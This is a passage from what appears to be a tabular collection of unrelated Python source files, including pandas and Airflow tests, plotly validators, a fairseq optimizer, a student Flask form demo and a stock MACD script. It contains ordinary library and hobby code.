      struct ArrowArray** children;
      struct ArrowArray* dictionary;

      // Release callback
      void (*release)(struct ArrowArray*);
      // Opaque producer-specific data
      void* private_data;
    };

    struct ArrowArrayStream {
      int (*get_schema)(struct ArrowArrayStream*, struct ArrowSchema* out);
      int (*get_next)(struct ArrowArrayStream*, struct ArrowArray* out);

      const char* (*get_last_error)(struct ArrowArrayStream*);

      // Release callback
      void (*release)(struct ArrowArrayStream*);
      // Opaque producer-specific data
      void* private_data;
    };
    """"""

# TODO use out-of-line mode for faster import and avoid C parsing
ffi = cffi.FFI()
ffi.cdef(c_source)"
JY531	JY531-common.py	"from contextlib import contextmanager
import os
import tempfile

import pytest

from pandas.io.pytables import HDFStore

tables = pytest.importorskip(""tables"")
# set these parameters so we don't have file sharing
tables.parameters.MAX_NUMEXPR_THREADS = 1
tables.parameters.MAX_BLOSC_THREADS = 1
tables.parameters.MAX_THREADS = 1


def safe_remove(path):
    if path is not None:
        try:
            os.remove(path)  # noqa: PDF008
        except OSError:
            pass


def safe_close(store):
    try:
        if store is not None:
            store.close()
    except OSError:
        pass


def create_tempfile(path):
    """"""create an unopened named temporary file""""""
    return os.path.join(tempfile.gettempdir(), path)


# contextmanager to ensure the file cleanup
@contextmanager
def ensure_clean_store(path, mode=""a"", complevel=None, complib=None, fletcher32=False):

    try:

        # put in the temporary path if we don't have one already
        if not len(os.path.dirname(path)):
            path = create_tempfile(path)

        store = HDFStore(
            path, mode=mode, complevel=complevel, complib=complib, fletcher32=False
        )
        yield store
    finally:
        safe_close(store)
        if mode == ""w"" or mode == ""a"":
            safe_remove(path)


@contextmanager
def ensure_clean_path(path):
    """"""
    return essentially a named temporary file that is not opened
    and deleted on exiting; if path is a list, then create and
    return list of filenames
    """"""
    try:
        if isinstance(path, list):
            filenames = [create_tempfile(p) for p in path]
            yield filenames
        else:
            filenames = [create_tempfile(path)]
            yield filenames[0]
    finally:
        for f in filenames:
            safe_remove(f)


def _maybe_remove(store, key):
    """"""
    For tests using tables, try removing the table to be sure there is
    no content from previous tests using the same table name.
    """"""
    try:
        store.remove(key)
    except (ValueError, KeyError):
        pass"
JD210	JD210-extraction_product_data.py	"import math
from collections.abc import MutableSequence
from object.sheet import Sheet


def extraction_product_data(sheet: Sheet) -> MutableSequence:
  """"""
  시트객체가 가진 특성들을 통해
  해당 시트에서 필요한 공산품 데이터를(셀값) MutableMapping형에 저장해서 each_sheet_products에 추가한뒤
  최종적으로 한 시트에 있는 모든 공산품 데이터가 담긴 each_sheet_products를 리턴
  """"""

  each_sheet_products = []

  for row in sheet.valid_range():
    product_data = {
    ""name"": """",
    ""attribute"": """",
    ""brand"": """",
    ""price"": """",
    ""code_number"": """"
    }
    product_data[""brand""] = sheet._main_brand

    

  for key, value in sheet.valid_keywords().items():
      
    if (isinstance(value, MutableSequence)):
      for item in value:
        name, price_col = item
        try:
          price_value = int(sheet.search_cell_value(price_col, row))
          product_data[key] += f""{name} : {price_value:.0f}, ""
        # price_value값이 None이거나 문자가 들어간 문자열일경우 int형 변환 실패
        except (ValueError, TypeError):
          product_data[key] += f""{name} : X, ""
      continue

    product_data[key] = str(sheet.search_cell_value(value, row)).replace(""\n"", """")
    
  # no_data 셀일경우 (키워드와 관련이 없는 셀) -> 빈셀(None)
    if (product_data[""name""] == ""None"" or product_data[""attribute""] == ""None""):
      continue
  each_sheet_products.append(product_data)
  return each_sheet_products




def get_product_data(sheets_data: MutableSequence) -> MutableSequence:
  """"""
  키워드와 매치되는 각 시트당 유효한 셀들의 위치를 담은 sheets_data를 매개변수로 받음
  sheets_data를 순회하며 각 시트에 접근
  """"""
  products = []
  
  for sheet in sheets_data:
    products.append(extraction_product_data(sheet))
  
  return products"
JD248	JD248-level.py	"from __future__ import annotations

from typing import TYPE_CHECKING

from components.base_component import BaseComponent

if TYPE_CHECKING:
    from entity import Actor


class Level(BaseComponent):
    parent: Actor

    def __init__(
        self,
        current_level: int = 1,
        current_xp: int = 0,
        level_up_base: int = 0,
        level_up_factor: int = 150,
        xp_given: int = 0,
    ):
        self.current_level = current_level
        self.current_xp = current_xp
        self.level_up_base = level_up_base
        self.level_up_factor = level_up_factor
        self.xp_given = xp_given

    @property
    def experience_to_next_level(self) -> int:
        return self.level_up_base + self.current_level * self.level_up_factor

    @property
    def requires_level_up(self) -> bool:
        return self.current_xp > self.experience_to_next_level

    def add_xp(self, xp: int) -> None:
        if xp == 0 or self.level_up_base == 0:
            return

        self.current_xp += xp

        self.engine.message_log.add_message(f""You gain {xp} experience points."")

        if self.requires_level_up:
            self.engine.message_log.add_message(
                f""You advance to level {self.current_level + 1}!""
            )

    def increase_level(self) -> None:
        self.current_xp -= self.experience_to_next_level

        self.current_level += 1

    def increase_max_hp(self, amount: int = 20) -> None:
        self.parent.fighter.max_hp += amount
        self.parent.fighter.hp += amount

        self.engine.message_log.add_message(""Your health improves!"")

        self.increase_level()

    def increase_power(self, amount: int = 1) -> None:
        self.parent.fighter.base_power += amount

        self.engine.message_log.add_message(""You feel stronger!"")

        self.increase_level()

    def increase_defense(self, amount: int = 1) -> None:
        self.parent.fighter.base_defense += amount

        self.engine.message_log.add_message(""Your movements are getting swifter!"")

        self.increase_level()"
JY242	JY242-module.py	"# Copyright (c) Meta Platforms, Inc. and affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.
# pyre-unsafe

from typing import Any, Sequence

from viktor._vendor.libcst._nodes.module import Module
from viktor._vendor.libcst._nodes.whitespace import NEWLINE_RE
from viktor._vendor.libcst._parser.production_decorator import with_production
from viktor._vendor.libcst._parser.types.config import ParserConfig


@with_production(""file_input"", ""(NEWLINE | stmt)* ENDMARKER"")
def convert_file_input(config: ParserConfig, children: Sequence[Any]) -> Any:
    *body, footer = children
    if len(body) == 0:
        # If there's no body, the header and footer are ambiguous. The header is more
        # important, and should own the EmptyLine nodes instead of the footer.
        header = footer
        footer = ()
        if (
            len(config.lines) == 2
            and NEWLINE_RE.fullmatch(config.lines[0])
            and config.lines[1] == """"
        ):
            # This is an empty file (not even a comment), so special-case this to an
            # empty list instead of a single dummy EmptyLine (which is what we'd
            # normally parse).
            header = ()
    else:
        # Steal the leading lines from the first statement, and move them into the
        # header.
        first_stmt = body[0]
        header = first_stmt.leading_lines
        body[0] = first_stmt.with_changes(leading_lines=())
    return Module(
        header=header,
        body=body,
        footer=footer,
        encoding=config.encoding,
        default_indent=config.default_indent,
        default_newline=config.default_newline,
        has_trailing_newline=config.has_trailing_newline,
    )"
JD108	JD108-const.py	"""""""
PostGIS to GDAL conversion constant definitions
""""""
# Lookup to convert pixel type values from GDAL to PostGIS
GDAL_TO_POSTGIS = [None, 4, 6, 5, 8, 7, 10, 11, None, None, None, None]

# Lookup to convert pixel type values from PostGIS to GDAL
POSTGIS_TO_GDAL = [1, 1, 1, 3, 1, 3, 2, 5, 4, None, 6, 7, None, None]

# Struct pack structure for raster header, the raster header has the
# following structure:
#
# Endianness, PostGIS raster version, number of bands, scale, origin,
# skew, srid, width, and height.
#
# Scale, origin, and skew have x and y values. PostGIS currently uses
# a fixed endianness (1) and there is only one version (0).
POSTGIS_HEADER_STRUCTURE = 'B H H d d d d d d i H H'

# Lookup values to convert GDAL pixel types to struct characters. This is
# used to pack and unpack the pixel values of PostGIS raster bands.
GDAL_TO_STRUCT = [
    None, 'B', 'H', 'h', 'L', 'l', 'f', 'd',
    None, None, None, None,
]

# Size of the packed value in bytes for different numerical types.
# This is needed to cut chunks of band data out of PostGIS raster strings
# when decomposing them into GDALRasters.
# See https://docs.python.org/library/struct.html#format-characters
STRUCT_SIZE = {
    'b': 1,  # Signed char
    'B': 1,  # Unsigned char
    '?': 1,  # _Bool
    'h': 2,  # Short
    'H': 2,  # Unsigned short
    'i': 4,  # Integer
    'I': 4,  # Unsigned Integer
    'l': 4,  # Long
    'L': 4,  # Unsigned Long
    'f': 4,  # Float
    'd': 8,  # Double
}

# Pixel type specifies type of pixel values in a band. Storage flag specifies
# whether the band data is stored as part of the datum or is to be found on the
# server's filesystem. There are currently 11 supported pixel value types, so 4
# bits are enough to account for all. Reserve the upper 4 bits for generic
# flags.
# See https://trac.osgeo.org/postgis/wiki/WKTRaster/RFC/RFC1_V0SerialFormat#Pixeltypeandstorageflag
BANDTYPE_PIXTYPE_MASK = 0x0F
BANDTYPE_FLAG_HASNODATA = 1 << 6"
JD4	JD4-fused_lamb.py	"# Copyright (c) Facebook, Inc. and its affiliates.
#
# This source code is licensed under the MIT license found in the
# LICENSE file in the root directory of this source tree.

from fairseq.optim import LegacyFairseqOptimizer, register_optimizer


@register_optimizer(""lamb"")
class FairseqLAMB(LegacyFairseqOptimizer):
    """"""LAMB optimizer.""""""

    def __init__(self, args, params):
        super().__init__(args)
        try:
            from apex.optimizers import FusedLAMB

            self._optimizer = FusedLAMB(params, **self.optimizer_config)
        except ImportError:
            raise ImportError(""Please install apex to use LAMB optimizer"")

    @staticmethod
    def add_args(parser):
        """"""Add optimizer-specific arguments to the parser.""""""
        # fmt: off
        parser.add_argument('--lamb-betas', default='(0.9, 0.999)', metavar='B',
                            help='betas for LAMB optimizer')
        parser.add_argument('--lamb-eps', type=float, default=1e-8, metavar='D',
                            help='epsilon for LAMB optimizer')
        parser.add_argument('--weight-decay', '--wd', default=0.0, type=float, metavar='WD',
                            help='weight decay')
        # fmt: on

    @property
    def optimizer_config(self):
        """"""
        Return a kwarg dictionary that will be used to override optimizer
        args stored in checkpoints. This allows us to load a checkpoint and
        resume training using a different set of optimizer args, e.g., with a
        different learning rate.
        """"""
        return {
            ""lr"": self.args.lr[0],
            ""betas"": eval(self.args.lamb_betas),
            ""eps"": self.args.lamb_eps,
            ""weight_decay"": self.args.weight_decay,
        }

    @property
    def supports_flat_params(self):
        return False"
JY49	JY49-gb2312prober.py	"######################## BEGIN LICENSE BLOCK ########################
# The Original Code is mozilla.org code.
#
# The Initial Developer of the Original Code is
# Netscape Communications Corporation.
# Portions created by the Initial Developer are Copyright (C) 1998
# the Initial Developer. All Rights Reserved.
#
# Contributor(s):
#   Mark Pilgrim - port to Python
#
# This library is free software; you can redistribute it and/or
# modify it under the terms of the GNU Lesser General Public
# License as published by the Free Software Foundation; either
# version 2.1 of the License, or (at your option) any later version.
#
# This library is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public
# License along with this library; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA
# 02110-1301  USA
######################### END LICENSE BLOCK #########################

from .mbcharsetprober import MultiByteCharSetProber
from .codingstatemachine import CodingStateMachine
from .chardistribution import GB2312DistributionAnalysis
from .mbcssm import GB2312_SM_MODEL

class GB2312Prober(MultiByteCharSetProber):
    def __init__(self):
        super(GB2312Prober, self).__init__()
        self.coding_sm = CodingStateMachine(GB2312_SM_MODEL)
        self.distribution_analyzer = GB2312DistributionAnalysis()
        self.reset()

    @property
    def charset_name(self):
        return ""GB2312""

    @property
    def language(self):
        return ""Chinese"""
JD492	JD492-test1.py	"# -*-coding:utf-8-*-
from flask import Flask, render_template, request
from datetime import datetime

app = Flask(__name__)

@app.route(""/"")
def test1():
    # 数据库获取数据
    text = ""YZQ""
    date_string = datetime.now().strftime(""%Y-%m-%d %H:%M:%S"")

    return render_template(""test1.html"", name=text, date=date_string)


# 测试锚点
@app.route(""/test2"")
def test2():
    return render_template(""test2.html"")


# 测试注册、登录
@app.route(""/test3"")
def test3():
    return render_template(""test3.html"")


# @app.route(""/do/ref"")
# def test4():
#     # 1、接收用户信息
#     username = request.args.get(""user"")
#     password = request.args.get(""pwd"")
#     role = request.args.get(""role"")
#     gender = request.args.get(""gender"")
#     hobby_list =request.args.getlist(""hobby"")
#     print(username, password, role, gender, hobby_list)
#
#     # 2、将注册信息，放置数据库（后续）
#     # 将注册信息，放置本地文件中
#     with open('account.txt', mode='a', encoding='utf-8') as f:
#         line = ""{}|{}|{}|{}|{}\n"".format(username, password, role, gender, hobby_list)
#         f.write(line)
#
#     # 3、返回信息
#     return ""success""


@app.route(""/do/ref"", methods=['POST'])
def test4():
    # 获取文件
    filename = request.files.get(""files"")
    filename.save('11.png')

    # 1、接收用户信息
    username = request.form.get(""user"")
    password = request.form.get(""pwd"")
    role = request.form.get(""role"")
    gender = request.form.get(""gender"")
    hobby_list =request.form.getlist(""hobby"")
    print(username, password, role, gender, hobby_list)

    # 2、将注册信息，放置数据库（后续）
    # 将注册信息，放置本地文件中
    with open('account.txt', mode='a', encoding='utf-8') as f:
        line = ""{}|{}|{}|{}|{}\n"".format(username, password, role, gender, hobby_list)
        f.write(line)

    # 3、返回信息
    return ""success""


if __name__ == '__main__':
    app.run()
    print('yzq1')"
JD206	JD206-SM09_addnl_functions.py	"import asyncio
from asyncio import AbstractEventLoop



class Event_ts(asyncio.Event):
    def __init__(self, _loop: AbstractEventLoop):
        super().__init__()
        self._loop = _loop
        # if self._loop is None:
        #     self._loop = asyncio.get_event_loop()

    def set(self):
        self._loop.call_soon_threadsafe(super().set)

    def clear(self):
        self._loop.call_soon_threadsafe(super().clear)


def event_background_loop(loop: asyncio.AbstractEventLoop) -> None:
    asyncio.set_event_loop(loop)
    loop.run_forever()

event =asyncio.Event()
def done():
    event.set()


async def firstWorker():
    while True:
        await event.wait()
        print(""First Worker Executed"")
        event.clear()

async def secondWorker():
    while True:
        await asyncio.sleep(1)
        print(""Second Worker Executed"")


# async def execution_time(flag, id):
#
#     while True:
#         # print(f'waiting for robot {id} for  execution')
#         await flag.wait()
#         print(f'Robot {id} execution timer has started')
#         #await asyncio.sleep(3)
#         start_time = datetime.now()
#         Events[""rob_execution""][id - 1] = True
#         while Events[""rob_execution""][id - 1] == True:
#             if data_opcua[""rob_busy""][id - 1] == True:
#                 # exec_time = (datetime.now() - start_time).total_seconds()
#                 # print(f""Robot {id} is running"")
#                 pass
#             elif data_opcua[""rob_busy""][id - 1] == False:
#                 Events[""rob_execution""][id - 1] = False
#         exec_time = (datetime.now() - start_time).total_seconds()
#
#         flag.clear()
#
#         return print(f""Robot {id} took {exec_time:,.2f} seconds to run"")
#
#
# async def process_execution(event, wk, product_pv):
#     process_time = order[""Process_times""][product_pv][wk-1]
#     await event.wait()
#     print(f""Process task executing at workstation {wk}"")
#     await asyncio.sleep(process_time)
#     print(""Process task completed on workstation "",wk )
#     #prod_release()
#     event.clear()"
JY105	JY105-internal_ips.py	"# -*- coding: utf-8 -*-
from collections.abc import Container
import ipaddress
import itertools


class InternalIPS(Container):
    """"""
    InternalIPS allows to specify CIDRs for INTERNAL_IPS.

    It takes an iterable of ip addresses or ranges.

    Inspiration taken from netaddr.IPSet, please use it if you can since
    it support more advanced features like optimizing ranges and lookups.
    """"""

    __slots__ = [""_cidrs""]

    def __init__(self, iterable, sort_by_size=False):
        """"""
        Constructor.

        :param iterable: (optional) an iterable containing IP addresses and
            subnets.

        :param sort_by_size: sorts internal list according to size of ip
            ranges, largest first.
        """"""
        self._cidrs = []
        for address in iterable:
            self._cidrs.append(ipaddress.ip_network(address))

        if sort_by_size:
            self._cidrs = sorted(self._cidrs)

    def __contains__(self, address):
        """"""
        :param ip: An IP address or subnet.

        :return: ``True`` if IP address or subnet is a member of this InternalIPS set.
        """"""
        address = ipaddress.ip_address(address)
        for cidr in self._cidrs:
            if address in cidr:
                return True
        return False

    def __hash__(self):
        """"""
        Raises ``TypeError`` if this method is called.
        """"""
        raise TypeError('InternalIPS containers are unhashable!')

    def __len__(self):
        """"""
        :return: the cardinality of this InternalIPS set.
        """"""
        return sum(cidr.num_addresses for cidr in self._cidrs)

    def __iter__(self):
        """"""
        :return: an iterator over the IP addresses within this IP set.
        """"""
        return itertools.chain(*self._cidrs)

    def iter_cidrs(self):
        """"""
        :return: an iterator over individual IP subnets within this IP set.
        """"""
        return sorted(self._cidrs)"
JD249	JD249-gui.py	"import os
from pathlib import Path
import ctypes
import wx
from login_gui import LoginFrame
from main_gui import MainFrame
from gui_util import LoginEvent, EVT_LOGIN_BINDER
from gui_util import User
import wx.lib.inspection as inspect


class StrifeApp(wx.App):
    login_frame: LoginFrame
    main_frame: MainFrame

    def OnInit(self):
        my_app_id = r'doron.strife.pc.1'
        ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(my_app_id)

        self.login_frame = LoginFrame(parent=None, title='Login to Strife', app=self)
        self.Bind(EVT_LOGIN_BINDER, self.onLoginAttempt)
        self.login_frame.Show()
        self.main_frame = MainFrame(parent=None, title='Strife')

        return True

    def onLoginAttempt(self, event):
        print(event)
        username, password = event.username, event.password
        print('login attempt with', username, password)
        # Add logic
        self.login_frame.Close()
        self.main_frame.Show()


if __name__ == '__main__':
    script_path = Path(os.path.abspath(__file__))
    wd = script_path.parent.parent.parent
    os.chdir(str(wd))

    app = StrifeApp()
    # For testing
    app.main_frame.friends_panel.add_user(User(f'iftah fans', '', 'assets/robot.png', chat_id=69))
    app.main_frame.friends_panel.add_user(User(f'da boys', '', 'assets/robot.png', chat_id=420))

    itamar = User(f'itamar', 'sup', 'assets/robot.png')
    gabzo = User(f'gabzo', 'hello there', 'assets/robot.png')

    app.main_frame.groups_panel.sizer.add_group(69, [itamar, itamar, itamar])
    app.main_frame.groups_panel.sizer.add_group(420, [gabzo, gabzo])

    for i in range(20):
        app.main_frame.groups_panel.sizer.groups[69][0].add_text_message(itamar, 'hello everyone!'+str(i))

    inspect.InspectionTool().Show()

    app.MainLoop()

"
JY188	JY188-asgi.py	"import engineio


class ASGIApp(engineio.ASGIApp):  # pragma: no cover
    """"""ASGI application middleware for Socket.IO.

    This middleware dispatches traffic to an Socket.IO application. It can
    also serve a list of static files to the client, or forward unrelated
    HTTP traffic to another ASGI application.

    :param socketio_server: The Socket.IO server. Must be an instance of the
                            ``socketio.AsyncServer`` class.
    :param static_files: A dictionary with static file mapping rules. See the
                         documentation for details on this argument.
    :param other_asgi_app: A separate ASGI app that receives all other traffic.
    :param socketio_path: The endpoint where the Socket.IO application should
                          be installed. The default value is appropriate for
                          most cases.
    :param on_startup: function to be called on application startup; can be
                       coroutine
    :param on_shutdown: function to be called on application shutdown; can be
                        coroutine

    Example usage::

        import socketio
        import uvicorn

        sio = socketio.AsyncServer()
        app = engineio.ASGIApp(sio, static_files={
            '/': 'index.html',
            '/static': './public',
        })
        uvicorn.run(app, host='127.0.0.1', port=5000)
    """"""
    def __init__(self, socketio_server, other_asgi_app=None,
                 static_files=None, socketio_path='socket.io',
                 on_startup=None, on_shutdown=None):
        super().__init__(socketio_server, other_asgi_app,
                         static_files=static_files,
                         engineio_path=socketio_path, on_startup=on_startup,
                         on_shutdown=on_shutdown)"
JD234	JD234-test_snap.py	"import pytest

from pandas import (
    DatetimeIndex,
    date_range,
)
import pandas._testing as tm


def astype_non_nano(dti_nano, unit):
    # TODO(2.0): remove once DTI/DTA.astype supports non-nano
    if unit == ""ns"":
        return dti_nano

    dta_nano = dti_nano._data
    arr_nano = dta_nano._ndarray

    arr = arr_nano.astype(f""M8[{unit}]"")
    if dti_nano.tz is None:
        dtype = arr.dtype
    else:
        dtype = type(dti_nano.dtype)(tz=dti_nano.tz, unit=unit)
    dta = type(dta_nano)._simple_new(arr, dtype=dtype)
    dti = DatetimeIndex(dta, name=dti_nano.name)
    assert dti.dtype == dtype
    return dti


@pytest.mark.filterwarnings(""ignore::DeprecationWarning"")
@pytest.mark.parametrize(""tz"", [None, ""Asia/Shanghai"", ""Europe/Berlin""])
@pytest.mark.parametrize(""name"", [None, ""my_dti""])
@pytest.mark.parametrize(""unit"", [""ns"", ""us"", ""ms"", ""s""])
def test_dti_snap(name, tz, unit):
    dti = DatetimeIndex(
        [
            ""1/1/2002"",
            ""1/2/2002"",
            ""1/3/2002"",
            ""1/4/2002"",
            ""1/5/2002"",
            ""1/6/2002"",
            ""1/7/2002"",
        ],
        name=name,
        tz=tz,
        freq=""D"",
    )
    dti = astype_non_nano(dti, unit)

    result = dti.snap(freq=""W-MON"")
    expected = date_range(""12/31/2001"", ""1/7/2002"", name=name, tz=tz, freq=""w-mon"")
    expected = expected.repeat([3, 4])
    expected = astype_non_nano(expected, unit)
    tm.assert_index_equal(result, expected)
    assert result.tz == expected.tz
    assert result.freq is None
    assert expected.freq is None

    result = dti.snap(freq=""B"")

    expected = date_range(""1/1/2002"", ""1/7/2002"", name=name, tz=tz, freq=""b"")
    expected = expected.repeat([1, 1, 1, 2, 2])
    expected = astype_non_nano(expected, unit)
    tm.assert_index_equal(result, expected)
    assert result.tz == expected.tz
    assert result.freq is None
    assert expected.freq is None"
JY227	JY227-test_clear_subdag.py	"# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
from __future__ import annotations

import datetime
import warnings

from airflow.models import DAG
from airflow.operators.bash import BashOperator
from airflow.operators.subdag import SubDagOperator

#


def create_subdag_opt(main_dag):
    subdag_name = ""daily_job""
    subdag = DAG(
        dag_id=""."".join([dag_name, subdag_name]),
        start_date=start_date,
        schedule=None,
        max_active_tasks=2,
    )
    BashOperator(bash_command=""echo 1"", task_id=""daily_job_subdag_task"", dag=subdag)
    with warnings.catch_warnings(record=True):
        return SubDagOperator(
            task_id=subdag_name,
            subdag=subdag,
            dag=main_dag,
        )


dag_name = ""clear_subdag_test_dag""

start_date = datetime.datetime(2016, 1, 1)

dag = DAG(dag_id=dag_name, max_active_tasks=3, start_date=start_date, schedule=""0 0 * * *"")

daily_job_irrelevant = BashOperator(
    bash_command=""echo 1"",
    task_id=""daily_job_irrelevant"",
    dag=dag,
)

daily_job_downstream = BashOperator(
    bash_command=""echo 1"",
    task_id=""daily_job_downstream"",
    dag=dag,
)

daily_job = create_subdag_opt(main_dag=dag)

daily_job >> daily_job_downstream"
JD407	JD407-file_system_key_value_storage.py	"import glob
from tempfile import gettempdir

import os

import errno

from cloudinary.cache.storage.key_value_storage import KeyValueStorage


class FileSystemKeyValueStorage(KeyValueStorage):
    """"""File-based key-value storage""""""
    _item_ext = "".cldci""

    def __init__(self, root_path):
        """"""
        Create a new Storage object.

        All files will be stored under the root_path location

        :param root_path: The base folder for all storage files
        """"""
        if root_path is None:
            root_path = gettempdir()

        if not os.path.isdir(root_path):
            os.makedirs(root_path)

        self._root_path = root_path

    def get(self, key):
        if not self._exists(key):
            return None

        with open(self._get_key_full_path(key), 'r') as f:
            value = f.read()

        return value

    def set(self, key, value):
        with open(self._get_key_full_path(key), 'w') as f:
            f.write(value)

        return True

    def delete(self, key):
        try:
            os.remove(self._get_key_full_path(key))
        except OSError as e:
            if e.errno != errno.ENOENT:  # errno.ENOENT - no such file or directory
                raise  # re-raise exception if a different error occurred

        return True

    def clear(self):
        for cache_item_path in glob.iglob(os.path.join(self._root_path, '*' + self._item_ext)):
            os.remove(cache_item_path)

        return True

    def _get_key_full_path(self, key):
        """"""
        Generate the file path for the key

        :param key: The key

        :return: The absolute path of the value file associated with the key
        """"""
        return os.path.join(self._root_path, key + self._item_ext)

    def _exists(self, key):
        """"""
        Indicate whether key exists

        :param key: The key

        :return: bool True if the file for the given key exists
        """"""
        return os.path.isfile(self._get_key_full_path(key))"
JY412	JY412-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""choropleth"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY407	JY407-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(
        self, plotly_name=""hoverlabel"", parent_name=""choroplethmapbox"", **kwargs
    ):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY251	JY251-genericworker.py	"#!/usr/bin/python3
# -*- coding: utf-8 -*-
#
#    Copyright (C) 2022 by YOUR NAME HERE
#
#    This file is part of RoboComp
#
#    RoboComp is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    RoboComp is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with RoboComp.  If not, see <http://www.gnu.org/licenses/>.

import sys, Ice, os
from PySide2 import QtWidgets, QtCore

ROBOCOMP = ''
try:
    ROBOCOMP = os.environ['ROBOCOMP']
except KeyError:
    print('$ROBOCOMP environment variable not set, using the default value /opt/robocomp')
    ROBOCOMP = '/opt/robocomp'

Ice.loadSlice(""-I ./src/ --all ./src/CommonBehavior.ice"")
import RoboCompCommonBehavior




class GenericWorker(QtCore.QObject):

    kill = QtCore.Signal()

    def __init__(self, mprx):
        super(GenericWorker, self).__init__()

        self.camerasimple_proxy = mprx[""CameraSimpleProxy""]
        self.humancamerabody_proxy = mprx[""HumanCameraBodyProxy""]
        self.yoloobjects_proxy = mprx[""YoloObjectsProxy""]

        self.mutex = QtCore.QMutex(QtCore.QMutex.Recursive)
        self.Period = 30
        self.timer = QtCore.QTimer(self)


    @QtCore.Slot()
    def killYourSelf(self):
        rDebug(""Killing myself"")
        self.kill.emit()

    # \brief Change compute period
    # @param per Period in ms
    @QtCore.Slot(int)
    def setPeriod(self, p):
        print(""Period changed"", p)
        self.Period = p
        self.timer.start(self.Period)"
JD29	JD29-macd.py	"import talib
from sqlalchemy import and_
import models
import pandas as pd
from StockToDB import fetchStockListFromDB, StockType

# 通过以下步骤计算MACD指标：
#
# 创建一个DataFrame来保存原始数据。可以使用Pandas的read_sql函数从数据库中读取数据，或者使用Pandas的read_csv函数从CSV文件中读取数据。
# 计算12天和26天的EMA。可以使用Pandas的ewm函数来计算指数加权移动平均线（EMA）。
# 计算DIF线。DIF线等于12天EMA减去26天EMA。
# 计算9天的EMA作为MACD的信号线。
# 计算MACD柱。MACD柱等于DIF线减去信号线。


def fetchDatas():
    lists = fetchStockListFromDB(StockType.HuShen, False)
    length_total = len(lists)
    handle = 0
    for item in lists:
        result = models.session.query(
            models.StockTrade
        ).filter(
            and_(
                models.StockTrade.sid == item[0]
            )
        ).order_by(
            models.StockTrade.timestamp.desc()
        ).limit(365).all()
        dif, dea, macd = calculate_macd(result)

        if macd > dif:
            print(f'MACD for the last day: 股票名称={item[3]}, 股票代码={item[2]}')
            print(f""最后一天的 MACD 数据：dif={dif}, dea={dea}, macd={macd}"")
            break


def calculate_macd(datas):
    # 将数据集转换为pandas DataFrame对象
    df = pd.DataFrame.from_records([data.__dict__ for data in datas])

    # 将timestamp列转换为日期格式
    df['date'] = pd.to_datetime(df['timestamp'], unit='ms').dt.date

    # 按日期排序
    df = df.sort_values(by='date')

    # 计算 MACD
    macd, macd_signal, macd_histogram = talib.MACD(df['close'], fastperiod=12, slowperiod=26, signalperiod=9)

    # 获取最后一天的 MACD 数据
    last_dif = macd.iloc[-1]
    last_dea = macd_signal.iloc[-1]
    last_macd = (last_dif-last_dea)*2
    # last_macd = macd_histogram.iloc[-1]
    return last_dif, last_dea, last_macd


